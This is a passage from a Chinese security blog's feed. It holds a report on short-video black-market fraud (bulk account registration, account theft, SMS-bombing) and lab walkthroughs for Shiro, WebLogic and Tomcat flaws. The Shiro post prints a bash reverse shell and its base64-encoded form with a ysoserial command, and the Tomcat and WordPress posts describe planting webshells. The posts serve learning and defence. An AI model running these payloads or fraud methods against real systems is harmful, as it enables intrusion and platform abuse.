如群控系统，能够让连接的多部手机根据既定脚本批量执行操作。对于账号注册部分，系统集合了过滑动验证、自动获取填写验证码、修改资料等功能。群控系统、触动精灵和改机工具结合使用，再接入接码平台和代理IP，就可以高效的产出质量过硬的号码。这种方式完全模仿真实用户，较难分辨。厂商可以从“虚假号码”、黑IP、用户行为及进入app后的操作顺序等角度着手判断。</li><li>注册机多是自动化批量注册的工具，技术手法有两种：模拟操作类：通过控件操作浏览器元素实现，真实加载注册页面，模拟用户操作。 协议破解类：通过HTTPS协议实现，破解注册接口协议，直接带参数调用注册接口实现注册。</li><li>跳转号：指使用QQ号或者微博快捷登录后，激活绑定而转化而成的平台账号。这里使用的QQ和微博号并非正常账号，而是称为授权号的特殊账号，这种账号在原有平台（QQ和微博）质量很低，无法进行大部分业务。所以只用作授权其他平台，购买成本仅几分钱。</li><li>盗号、扫号和养号：老号指有一定注册时间、自身带有权重的号码，有的还带有一定的粉丝与作品。这类号码被认为不易封号，在市场上受欢迎。老号和带有一定权限等级的号码，一般是采用这三种方式得到的：<ol><li>盗号：主要方式是钓鱼，如发布二次打包的软件⸺将某些软件打包 加入自己需要的功能，当用户使用这些动过手脚的软件时，黑客就会收到他们的账户名、密码 。</li><li>扫号：方法有两种：1、用接码平台的手机号作为用户名，遇到注册过的直接修改密码，这种属于黑吃黑，拿走了别人批量注册的号码。2、使用其他手段获取大量账号名，加上弱密码，去逐一验证，这种账号是真实用户，对平台伤害较大。</li><li>养号：号商注册后模仿真实用户进行一些操作，将号码养老的行为。大多是为了提高账号的权重，以方便之后的项目。平台伤害较大。</li></ol></li></ol></li></ol><p>2.5 引流变现：一个简单的引流变现操作是这样的：操作者在头像、昵称、个人资料等地方留下微信号，再使用各种方式增加曝光度，从而使更多的用户前往添加微信，之后使用微信进行深度变现。以下介绍短视频平台上几个常见的方法：</p><ol><li>同城视频利用：在同城界面，距离我们越近的人，他的视频就会被排在越靠前的位置。这一点被利用形成了一种引流方式⸺“出0.1播放量”。有的改机工具也提供虚拟定位功能，利用此功能，可以使定位点十几公里内的人，看到该视频的距离都是0.1km，从而让视频排长久霸占在置顶的位置 上。</li><li>评论、直播引流等：评论引流即在特定热门视频下评论吸引用户，有时会配合刷量，将其刷成热门评论。直播引流有很多方法，如在直播间挂入小号批量评论。也有利用工具转播其他平台的直播，收取礼物提现，顺便使用资料曝光微信号引流。</li><li>群控系统和模拟器：操作者也可以使用群控自动上传作品。有些短视频平台检测到账号资料有留下微信号，封面话语露骨时，会认为有引流意图，进行封号或屏蔽该账号的视频。群控系统还可以通过加入监控解决这个问题：先上传视频，当有一定播放量以后，认为通过了平台检测，及时通知操作者更改资料进行引流。除了使用真机，也有很多人使用模拟器达到目的，有些模拟器也增加了一些改机功能，操作简单，刷新或重启动后就是另外一套参数。安卓模拟器较为常见，引流和搬运薅羊毛多是使用模拟器进行。</li><li>出粉：一些数量的引流操作，可以带来非常巨大的流量，个人无法消耗，会以“出粉”形式卖出，即买家按照成功加微信的“人头”数，付给引流者报酬。</li></ol><p>2.6 视频采集：通过视频播放量等方法的引流，对视频需求量很大，于是市场上有非常多的采集网站和采集软件。这些软件可以解析出视频的真实地址，达到无水印下载的目的。 黑灰产也遵循需求产生产品的原则，薅羊毛小团伙和个人，往往会使用解析网站单个下载视频。</p><h1 id="短视频黑灰产团伙画像"><a href="#短视频黑灰产团伙画像" class="headerlink" title="短视频黑灰产团伙画像"></a>短视频黑灰产团伙画像</h1><h2 id="1-短视频黑灰产团伙"><a href="#1-短视频黑灰产团伙" class="headerlink" title="1.短视频黑灰产团伙"></a>1.短视频黑灰产团伙</h2><p>行为分析：</p><p>黑产除了常见的刷粉、刷流量之外，连简单的视频后期包装也被搬上了某宝产业链。在搜索引擎找到某刷粉平台，可以看到，刷粉、刷播放量、刷评论以及点赞甚至转发都能够明码标价进行交易，甚至还有专门的刷粉软件出售。</p><p>除此之外，为了获取平台更多的分成，已经涌现出不少运营大量垃圾号的个人或者团队，在部分短视频平台依靠个性化推送，一些劣质内容很容易就混进去。这些垃圾号发布的内容基本是靠搬运+简单剪辑，只求量而不求质的内容。利用标题以及带有诱惑性封面来骗取更多的流量，基于流量数据，平台也提供可观的奖励。这种现象在自媒体平台以及部分短视频平台都比较普遍，也带动了短视频平台账号及相关软件的买卖服务。平台的风控策略越严，运营时间越久，平台用户质量越高，价格就会越高。</p><p>大部分的薅羊毛和引流，都是个人和小团伙在操作，大不过一个小型工作室。不过这些团伙常常聚集在QQ群和微信群，集体行动、传播消息，一些群主能够积累数量庞大的下线。 群主会先放出薅羊毛项目或引流方法吸引人们加群，再通过微信、Q群和“圈子”放出 自己的付费群号码，收费从百元到千元不等。付费群可以获取质量好盈利高的项目、 分享最新的自动化工具、甚至提供各种黑灰产相关的技术和服务。</p><h2 id="2-直播答题黑灰产团伙"><a href="#2-直播答题黑灰产团伙" class="headerlink" title="2.直播答题黑灰产团伙"></a>2.直播答题黑灰产团伙</h2><p>行为分析：</p><p>根据各个平台直播答题的规则，全部答对12道题确实不太容易，所以平台允许一次复活机会。按照规则复活机会除了官方活动之外只能通过邀请新用户加入并填写邀请码来获得，因此刷复活码也逐渐形成了链式推广。此外，卖题库、卖答题外挂也成了黑灰产的盈利手段。 </p><p>一般平台对于复活机会不设上限，也就是说，能邀请多少新号填写自己邀请码就能获得多少次复活机会。为此，淘宝上很快出现售卖复活卡的链接，单价一元或者0.5元，看起来非常便宜，这其实跟刷粉丝数差不多，通过某种方式创建无限小号，成本也是非常低的。</p><p>除了购买复活卡来提升瓜分奖金的机率之外，确保答对全部题目显然更加靠谱。因此部分人总结出所谓的出题规则，比如常识、历史上的今天等，在淘宝或者QQ群公开售卖题库。不过，题库蒙题的成功率并不理想。在国内以QQ和微信为主要线上交流渠道的当下环境中，拉群集思广益一起答题成了答题玩家以及黑灰产的首选。在QQ群搜索各个答题平台的关键词，可以搜到大量相关的群组，有些群进群还要付费。</p><p>不过，受到热捧的还是答题辅助软件。一般在直播答题中， 问题会以文字形式出现在屏幕上，同时主持人还会语音念出题目。这也让一众软件开发者急中生智，利用语音识别或者OCR识别的方式在问题出现后，迅速调用搜索引擎搜索问题以及答案，10秒钟的答题时间手动百度几乎不现实，而通过软件完全可以找到正确答案再选择。目前，这种软件在淘宝、各种QQ、微信交流群广泛传播，种类也非常多，自己开发或者盗用别人开发的软件公开售卖的现象，比比皆是。</p><h1 id="应对方法与安全建议"><a href="#应对方法与安全建议" class="headerlink" title="应对方法与安全建议"></a>应对方法与安全建议</h1><p>直播竞答和短视频平台最大的隐患，在于机器流量、广告引流、垃圾信息、薅羊毛等几大问题。要想应对这些问题，需要从上游环节或者技术上进行控制。此外，合规与监管方面也需要注意。</p><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>由于问答型app最近火热，上线比较快，并没有考虑过多安全方面问题。于是就会出现一些常规的安全问题，比如短信接口控制不严，可以滥用短信接口，导致短信轰炸影响用户以及消耗厂商信息资费。</p><p>输入手机号发送验证码，截获发送验证码请求包。遍历手机号，可对无限量的手机号发送短信验证码请求，返回成功。</p><p>针对这个案例，可以限制短信接口的访问频率以及速度；同时加入图形验证码，避免机器发包，进而避免相关的安全问题。</p><h2 id="应对方案"><a href="#应对方案" class="headerlink" title="应对方案"></a>应对方案</h2><p>事实上，短视频平台与黑产之间的博弈战一直在进行。例如，今日头条专门针对刷粉行为，根据粉丝活跃程度、信息完整性、异常涨粉等行为进行“非真实用户”评估。同时，各大短视频平台也逐渐提升审核机制，几乎每周、每个月，都会公布一系列涉及垃圾营销号或者标题党帐号的封禁公告。 但是，在短视频行业的黑灰产中，下游的具体黑色行为与账号、卡号、工具等密切相关，要相应对这些问题，还是需要从上游环节入手，进行对抗。</p><p>1.针对手机黑卡、代理IP</p><p>卡商、代理IP、工具开发等产业，不只是针对短视频平台，分别深挖都是一条完整的产业链。对于这一环节，作为企业，最快捷的方式是<strong>从专业公司获取经过审计的手机黑卡、恶意IP、高危账号等数据。将其作为自己后台黑白名单数据的补充情报库，在注册或活动流程中接入审计策略，对恶意注册进行筛选监控等。</strong></p><p>更新及时、有效性高、数据全面的情报库，可以让企业投入的经费能得到有效利用， 尽量减少因黑卡等产业带来的损失。</p><p>2.针对账号商人 </p><p>结合恶意数据情报库，<strong>对可疑用户提高注册门槛、增加复杂验证码等，并对这些用户进行重点监控，当其进行敏感操作时，进行防护。</strong>恶意数据情报库包括：黑产掌握的黑卡号码、使用的代理IP、已经泄露的账号密码数据等。一方面要结合自身后台数据的黑白名单，另一方面也要引入第三方的支持，进行更全面的检测。</p><p>3.针对黑产技术人员</p><p>黑产工具开发人员会针对平台的注册流程，进行攻破，如接入打码平台填写图形验证码等，以实现批量化操作，对于这类问题。企业需要擅用黑产产业链情报。如分析黑产的注册流程和攻击工具。批量行为都是有迹可循的。企业可以针对恶意用户的行为偏好和其在黑产中的使用广度，在设备信息、注册信息重合度、恶意用户的行为数据等方面，进行多维度的判断。根据其攻击目的，在适宜的地方增加对方的攻击成本。 </p><p>如，针对疑似羊毛党用户，在提现、积分兑换礼品等地方，提升操作门槛，要求验证绑定的手机号等。结合产业链情报，企业就可以针对攻击场景和攻击目的，进行更精准的打击。</p><p>从另一个层面来说，平台在自身运营时，也要注意从事前准备、事中监控&amp;响应、事后总结这三个环节入手，来确保业务安全。</p><p>产品或业务上线前，可以借助第三方安全厂商或白帽众测服务查找漏洞并修复；在涉及与开发阶段就考虑到风控等需求，适当引入第三方风控服务。在运营过程中，可以依赖大数据、IP与账号黑名单等，在关键阶段进行门槛性限制。同时准备好应急预案，在运营过程中持续监控，一旦发现问题，就及时响应。风险事件发生后，除了迅速应对，还要对异常行为、异常账户、异常数据等进行分析，抽取相关的IP、账号等信息，沉淀为历史数据，供以后使用。必要时，可以报警调查，并根名单数据，追回风险事件所造成的损失。 </p><p>以直播答题为例，通过风险设备识别、行为风险识别、关联风险识别等策略模型针对机器作弊行为进行防范，可以有效鉴别机器流量，解决直播答题场景中的“机器注册”、“机器登录”、“机器流量”等问题，从源头识别欺诈风险。 </p><p>此外，采用OCR识别和NLP技术，可全面高效识别文字、图片内的垃圾广告，仅微信变体就已识别数千种，可有效清除导流广告、变体广告等。</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>[1]深渊背后的真相之[短视频黑灰产业]报告，FreeBuf与威胁猎人联合研究成果</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;短视频行业&quot;&gt;&lt;a href=&quot;#短视频行业&quot; class=&quot;headerlink&quot; title=&quot;短视频行业&quot;&gt;&lt;/a&gt;短视频行业&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;互联网不变的主题：流量与变现。流量的抢夺和积累是变现的开始。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;短视频
      
    
    </summary>
    
    
    
      <category term="黑灰产" scheme="http://yoursite.com/tags/%E9%BB%91%E7%81%B0%E4%BA%A7/"/>
    
  </entry>
  
  <entry>
    <title>2020-01-30 SOL-LIGHTNET&#39;</title>
    <link href="http://yoursite.com/2021/02/18/SOL-LIGHTNET/"/>
    <id>http://yoursite.com/2021/02/18/SOL-LIGHTNET/</id>
    <published>2021-02-18T03:52:16.000Z</published>
    <updated>2021-02-18T14:16:36.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-01-30-TRAFFIC-ANALYSIS-EXERCISE-SOL-LIGHTNET"><a href="#2020-01-30-TRAFFIC-ANALYSIS-EXERCISE-SOL-LIGHTNET" class="headerlink" title="2020-01-30 - TRAFFIC ANALYSIS EXERCISE - SOL-LIGHTNET"></a>2020-01-30 - TRAFFIC ANALYSIS EXERCISE - SOL-LIGHTNET</h1><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><p>根据pcap文件和相关警报编写事件报告。</p><h1 id="设想"><a href="#设想" class="headerlink" title="设想"></a>设想</h1><p>局域网段数据：</p><ul><li>LAN网段范围：10.20.30.0/24（10.20.30.0至10.20.30.255）</li><li>域：sol-lightnet.com</li><li>域控制器：10.20.30.2-Sol-Lightnet-DC</li><li>局域网网段网关：10.20.30.1</li><li>局域网段广播地址：10.20.30.255</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2020-01-30-TRAFFIC-ANALYSIS-EXERCISE-SOL-LIGHTNET&quot;&gt;&lt;a href=&quot;#2020-01-30-TRAFFIC-ANALYSIS-EXERCISE-SOL-LIGHTNET&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
    
      <category term="traffic analysis" scheme="http://yoursite.com/tags/traffic-analysis/"/>
    
  </entry>
  
  <entry>
    <title>Web-Developer</title>
    <link href="http://yoursite.com/2020/09/05/Web-Developer/"/>
    <id>http://yoursite.com/2020/09/05/Web-Developer/</id>
    <published>2020-09-05T05:02:08.000Z</published>
    <updated>2020-09-05T16:37:41.863Z</updated>
    
    <content type="html"><![CDATA[<p>1、使用netdiscover arp扫描同一网段的其他主机</p><img src="/2020/09/05/Web-Developer/1.png" class title="This is an image"><p>2、继续使用nmap扫描目标ip，找到开放的端口及服务</p><img src="/2020/09/05/Web-Developer/2.png" class title="This is an image"><p>3、打开网站，是个wordpress框架（WordPress是一个以PHP和MySQL为平台的博客软件和内容管理系统）</p><img src="/2020/09/05/Web-Developer/3.png" class title="This is an image"><p>4、网页没什么东西，常规扫一下目录</p><img src="/2020/09/05/Web-Developer/4.png" class title="This is an image"><p>有个ipdata目录，里面有数据包，下载下来查看一下。另外还有wp-admin目录，要登录，先放着</p><img src="/2020/09/05/Web-Developer/5.png" class title="This is an image"><p>5、在数据包中查看http协议的数据包，可以看到有登录wp-admin的行为，并且成功登录，内有账号和密码</p><p>webdeveloper/Te5eQg&amp;4sBS!Yr$)wf%(DcAd</p><img src="/2020/09/05/Web-Developer/6.png" class title="This is an image"><p>6、拿此账号密码登录wp-admin后台</p><img src="/2020/09/05/Web-Developer/7.png" class title="This is an image"><p>登录成功</p><img src="/2020/09/05/Web-Developer/8.png" class title="This is an image"><p>7、找个上传点：Appearance-Themes</p><img src="/2020/09/05/Web-Developer/9.png" class title="This is an image"><p>8、上传一个php</p><img src="/2020/09/05/Web-Developer/10.png" class title="This is an image"><p>9、连上</p><img src="/2020/09/05/Web-Developer/11.png" class title="This is an image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、使用netdiscover arp扫描同一网段的其他主机&lt;/p&gt;
&lt;img src=&quot;/2020/09/05/Web-Developer/1.png&quot; class title=&quot;This is an image&quot;&gt;

&lt;p&gt;2、继续使用nmap扫描目标ip，找到开放的端
      
    
    </summary>
    
    
    
      <category term="vulhub练习" scheme="http://yoursite.com/tags/vulhub%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>shiro-cve_2016_4437</title>
    <link href="http://yoursite.com/2020/09/03/shiro-cve-2016-4437/"/>
    <id>http://yoursite.com/2020/09/03/shiro-cve-2016-4437/</id>
    <published>2020-09-03T06:33:50.000Z</published>
    <updated>2020-09-03T11:25:36.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Shiro是一款开源安全框架，提供<strong>身份验证、授权、密码学和会话管理</strong>。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥<strong>伪造用户Cookie</strong>，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt;  Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码（硬编码是指将可变变量用一个固定值来代替的方法）的，就导致了攻击者可以构造恶意数据造成<strong>反序列化的RCE</strong>漏洞。</p><p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache Shiro &lt;= 1.2.4</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>1、访问页面</p><img src="/2020/09/03/shiro-cve-2016-4437/1.png" class title="This is an image"><p>2、在攻击机上运行nc 监听1234端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 1234</span><br></pre></td></tr></table></figure><p>3、将反弹shell指令进行加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击者IP&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><img src="/2020/09/03/shiro-cve-2016-4437/3.png" class title="This is an image"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0NC4xMjgvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>4、运行指令（通过 ysoserial中的JRMP监听模块，监听 6666 端口并执行反弹shell命令）</p><p>【ysoserial工具（概念证明工具，用于生成利用不安全的Java对象反序列化的有效负载】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0NC4xMjgvMTIzNCAwPiYxCg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><blockquote><p>payloads/JRMPClient 是结合 exploit/JRMPListener 使用的；<br>JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后Server中进行反序列化操作，并开启指定端口，然后在通过JRMPClient去发送攻击 payload；<br>payloads/JRMPClient 生存的 payload 是发送给目标机器的，exploit/JRMPListener 是在自己服务器上使用的。</p></blockquote><p>5、伪造cookie内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python shiro.py 攻击者IP:攻击者监听的java端口</span><br><span class="line">&#x2F;&#x2F; 输出生成的rememberMe&#x3D;xxxx</span><br></pre></td></tr></table></figure><p>6、前台登录</p><img src="/2020/09/03/shiro-cve-2016-4437/2.png" class title="This is an image"><p>注意需要勾选Remember Me</p><img src="/2020/09/03/shiro-cve-2016-4437/4.png" class title="This is an image"><p>7、截获数据包，改变Cookie值</p><img src="/2020/09/03/shiro-cve-2016-4437/6.png" class title="This is an image"><p> 8、使用生成的payload，替换请求中的cookie信息</p><img src="/2020/09/03/shiro-cve-2016-4437/7.png" class title="This is an image"><p>9、查看java监听接口和nc监听接口，并成功执行相关命令。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从官方的 issue 上来看，存在几个重要的点：</p><ul><li>rememberMe cookie</li><li>CookieRememberMeManager.java</li><li>Base64</li><li>AES</li><li>加密密钥硬编码</li><li>Java serialization</li></ul><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>shiro 1.3.2的代码，官方的操作如下：</p><pre><code>- 删除代码里的默认密钥- 默认配置里注释了默认密钥- 如果不配置密钥，每次会重新随机一个密钥</code></pre><p>可以看到并没有对反序列化做安全限制，只是在逻辑上对该漏洞进行了处理。<br>如果在配置里自己单独配置AES的密钥，并且密钥一旦泄露，那么漏洞依然存在。</p><p>漏洞修复：</p><pre><code>升级shiro到1.2.5及以上如果在配置里配置了密钥，那么请一定不要使用网上的密钥，一定不要！！请自己base64一个AES的密钥，或者利用官方提供的方法生成密钥：org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;Apache Shiro是一款开源安全框架，提供&lt;strong&gt;身份验证、授权、密码学和会话管理&lt;/strong&gt;。Shir
      
    
    </summary>
    
    
    
      <category term="vulfocus练习" scheme="http://yoursite.com/tags/vulfocus%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>2020-07-31 -- Traffic analysis exercise - Tecsolutions</title>
    <link href="http://yoursite.com/2020/09/01/exercise-Tecsolutions/"/>
    <id>http://yoursite.com/2020/09/01/exercise-Tecsolutions/</id>
    <published>2020-09-01T15:10:17.000Z</published>
    <updated>2020-09-01T16:54:42.791Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
      <category term="流量分析" scheme="http://yoursite.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>weblogic-cve_2017_10271</title>
    <link href="http://yoursite.com/2020/09/01/weblogic-cve-2017-10271/"/>
    <id>http://yoursite.com/2020/09/01/weblogic-cve-2017-10271/</id>
    <published>2020-09-01T14:59:58.000Z</published>
    <updated>2020-09-01T15:19:54.266Z</updated>
    
    <content type="html"><![CDATA[<p>Weblogic XMLDecoder反序化</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的<strong>WLS Security子组件</strong>存在安全漏洞。使用精心构造的xml数据可能造成<strong>任意代码执行</strong>，攻击者只需要发送精心构造的<strong>xml恶意数据</strong>，就可以拿到目标服务器的权限。</p><p>wls-wsat路径： /root/Oracle/Middleware//user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Oracle WebLogic Server 10.3.6.0.0版本<br>Oracle WebLogic Server 12.1.3.0.0版本<br>Oracle WebLogic Server 12.2.1.1.0版本</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1、访问页面</p><img src="/2020/09/01/weblogic-cve-2017-10271/1.png" class title="This is an image"><p>2、初步判断</p><p>访问：<a href="http://127.0.0.1:7001/wls-wsat/CoordinatorPortType11，存在下图则说明可能存在漏洞。" target="_blank" rel="noopener">http://127.0.0.1:7001/wls-wsat/CoordinatorPortType11，存在下图则说明可能存在漏洞。</a></p><img src="/2020/09/01/weblogic-cve-2017-10271/2.png" class title="This is an image"><p>3、构造post包，执行python验证脚本</p><img src="/2020/09/01/weblogic-cve-2017-10271/3.png" class title="This is an image"><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP（一个基于xml格式的web交互协议）请求首先在weblogic.wsee.jaxws.workcontext.WorkContextServerTube类中获取<strong>XML数据</strong>最终传递给<strong>XMLDecoder来解析</strong>，其解析XML的调用链为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest</span><br><span class="line">&#x2F;&#x2F; 获取到localHeader1后传递给readHeaderOld方法，其内容为&lt;work:WorkContext&gt;所包裹的数据，然后继续跟进</span><br><span class="line">2、weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld</span><br><span class="line">&#x2F;&#x2F; 在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，最后通过XMLDecoder来进行反序列化操作</span><br><span class="line">&#x2F;&#x2F; public WorkContextXmlInputAdapter(InputStream paramInputStream)&#123;this.xmlDecoder&#x3D;new XMLDecoder(paramInputStream)&#125;</span><br><span class="line">3、weblogic.wsee.workarea.WorkContextXmlInputAdapter</span><br></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.临时解决方案<br>根据攻击者利用POC分析发现所利用的为wls-wsat组件的CoordinatorPortType接口，若Weblogic服务器集群中未应用此组件，建议临时备份后将此组件删除，当形成防护能力后，再进行恢复。</p><p>根据实际环境路径，删除WebLogic wls-wsat组件：</p><p>rm -f   /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</p><p>rm -f   /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</p><p>rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat</p><p>重启Weblogic域控制器服务:</p><p>DOMAIN_NAME/bin/stopWeblogic.sh           #停止服务</p><p>DOMAIN_NAME/bin/startManagedWebLogic.sh    #启动服务</p><p>删除以上文件之后，需重启WebLogic。确认<a href="http://weblogic_ip/wls-wsat/" target="_blank" rel="noopener">http://weblogic_ip/wls-wsat/</a> 是否为404页面。</p><p>2.官方补丁修复<br>前往Oracle官网下载10月份所提供的安全补丁</p><p><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html</a></p><p>升级过程可参考：</p><p><a href="http://blog.csdn.net/qqlifu/article/details/49423839" target="_blank" rel="noopener">http://blog.csdn.net/qqlifu/article/details/49423839</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Weblogic XMLDecoder反序化&lt;/p&gt;
&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Oracle Fusion Middleware中的Oracle
      
    
    </summary>
    
    
    
      <category term="vulfocus练习" scheme="http://yoursite.com/tags/vulfocus%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>tomcat-pass-getshell</title>
    <link href="http://yoursite.com/2020/08/26/tomcat-pass-getshell/"/>
    <id>http://yoursite.com/2020/08/26/tomcat-pass-getshell/</id>
    <published>2020-08-26T13:13:38.000Z</published>
    <updated>2020-08-26T13:23:52.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>Tomcat是Jakarta项目开发的<strong>Servlet</strong>容器，实现了<strong>对Servlet和JavaServer Page（JSP）的支持</strong>，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全局管理和Tomcat阀等。</p><p>由于Tomcat本身也内含了HTTP服务器，因此也可以视作<strong>单独的Web服务器</strong>。但是，不能将Tomcat和Apache HTTP服务器混淆，Apache HTTP服务器是用C语言实现的HTTP Web服务器；这两个HTTP web server不是捆绑在一起的。Apache Tomcat包含了配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。</p><p>Apache Tomcat的默认端口是8080，管理后台是tomcat manager，后台的路径是 /manager/html。</p><p>tomcat manager后台的弱口令账户密码是tomcat/tomcat。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>1、访问页面</p><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>54766/tcp</td><td>open</td><td>http</td><td>Apache  Tomcat/Coyote JSP engine 1.1</td></tr></tbody></table><img src="/2020/08/26/tomcat-pass-getshell/1.png" class title="This is an image"><p>2、直接尝试弱口令登入 Manager App 后台</p><img src="/2020/08/26/tomcat-pass-getshell/2.png" class title="This is an image"><p>3、往下翻，发现可以上传war包，war file to deploy</p><img src="/2020/08/26/tomcat-pass-getshell/3.png" class title="This is an image"><p>4、制作war包，将jsp马压缩为zip，改后缀为war，上传</p><img src="/2020/08/26/tomcat-pass-getshell/4.png" class title="This is an image"><p>5、然后构造木马访问路径 http://靶机地址/压缩包名/shell名.jsp(想要执行你的 war 文件，你需要进入该目录并点击 war 文件，或者是直接在 URL 里访问)</p><p>6、用冰蝎连接，成功后找flag，在tmp下</p><img src="/2020/08/26/tomcat-pass-getshell/5.png" class title="This is an image"><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>1、Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>2、Tomcat7+权限分为：</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有html页面权限</li><li>admin-script 